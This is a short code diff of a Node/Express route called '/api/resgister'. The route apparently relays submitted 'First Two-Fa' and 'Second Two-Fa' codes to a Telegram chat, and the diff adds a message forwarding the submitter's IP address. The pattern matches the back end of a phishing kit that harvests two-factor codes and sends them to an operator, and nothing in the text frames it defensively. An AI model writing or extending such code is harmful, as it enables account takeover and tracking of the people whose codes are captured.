@@ -36,8 +36,11 @@ app.post('/api/resgister', (req, res) => {
 <strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
 <strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
 
+const messageIp = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}`;
+
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
+    bot.sendMessage(process.env.CHAT_ID, messageIp,  { parse_mode: 'HTML' });
 
     // bot_two.sendMessage(process.env.CHAT_ID_BOT_TWO, location,  { parse_mode: 'HTML' });
 
